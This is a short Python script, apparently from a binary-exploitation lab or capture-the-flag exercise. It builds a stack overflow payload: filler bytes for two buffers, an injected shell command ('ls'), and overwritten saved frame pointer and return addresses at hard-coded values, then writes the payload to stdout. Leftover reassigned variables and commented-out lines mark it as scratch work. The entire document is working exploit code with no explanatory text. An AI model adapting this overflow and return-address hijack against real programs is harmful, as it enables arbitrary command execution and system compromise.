import sys

command = b"ls -a"
command += b"\x00" * (10 - len(command))

text_buffer = b"T" * 64
b_buffer = b"b" * 70

rbp = b"\xff\xff\xcd\x30" + b"\x00\x00\x00\x00"

rip = b"\x00\x40\x10\xec" + b"\x00\x00\x00\x01"

payload = text_buffer + b_buffer + command + rbp + rip


payload = b"ls"
payload += b"\x73" * (10 - len(payload))
rbp = b"\xff\xff\xcb\x30" + b"\x00\x00\x00\x00"
rip1 = b"\x00\x40\x12\x40" + b"\x00\x00\x00\x01"
rip2 = b"\x00\x40\x12\x80" + b"\x00\x00\x00\x01"
# test_bomb = b"a" * 63 + b"\x00" + b"b" * 69 + b"\x00" + payload + rbp + rip1 + rip2

test_bomb = b"a" * 64 + b"b" * 70 + payload  + b"\x72" * 4 + b"\x00" * 4 + b"\x72"

# print(len(payload))
# print(test_bomb)
# print("aaa")
out = sys.stdout.buffer
out.write(test_bomb)